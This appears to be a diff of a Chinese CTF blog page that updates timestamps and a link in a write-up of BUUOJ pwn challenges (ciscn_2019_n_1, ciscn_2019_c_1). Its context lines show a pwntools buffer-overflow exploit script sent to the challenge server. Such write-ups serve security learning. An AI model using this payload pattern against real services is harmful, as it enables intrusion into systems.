@@ -69,7 +69,7 @@
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;QQ截图20200108152148.png">
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;QQ截图20200103205054.png">
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;QQ截图20200103230137.png">
-<meta property="og:updated_time" content="2020-01-08T12:19:56.173Z">
+<meta property="og:updated_time" content="2020-01-08T12:22:42.044Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;QQ截图20200103163106.png">
 
@@ -226,7 +226,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-01-08 20:19:56" itemprop="dateModified" datetime="2020-01-08T20:19:56+08:00">2020-01-08</time>
+                <time title="修改时间：2020-01-08 20:22:42" itemprop="dateModified" datetime="2020-01-08T20:22:42+08:00">2020-01-08</time>
               </span>
 
           
@@ -261,7 +261,7 @@
 <p><img src="\images\QQ截图20200104112812.png" alt="QQ截图20200104112812"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#apwn = process('./ciscn_2019_n_1')</span></span><br><span class="line">apwn = remote(<span class="string">'node3.buuoj.cn'</span> , <span class="string">'27695'</span>)</span><br><span class="line">print(apwn.recv())</span><br><span class="line">payload = <span class="string">'a'</span>.encode() * <span class="number">0x2c</span>  + p64(<span class="number">0x41348000</span>)</span><br><span class="line">apwn.sendline(payload)</span><br><span class="line">apwn.interactive()</span><br></pre></td></tr></table></figure>
 <h3 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h3><p>首先感谢这位大佬的wp，（这道题几乎全程在<del>抄袭</del>学习大佬的思路）</p>
-<p><a href="https://blog.csdn.net/qinying001/article/details/103266763（博客原址）" target="_blank" rel="noopener">https://blog.csdn.net/qinying001/article/details/103266763（博客原址）</a></p>
+<p><a href="https://blog.csdn.net/qinying001/article/details/103266763" target="_blank" rel="noopener">https://blog.csdn.net/qinying001/article/details/103266763</a>    （博客原址）</p>
 <p>先checksec</p>
 <p><img src="\images\QQ截图20200108132526.png" alt="QQ截图20200108132526"></p>
 <p>64位程序，除了NX以外没有开保护。打开ida（<del>由于这程序看上去有点复杂所以点开F5</del></p>
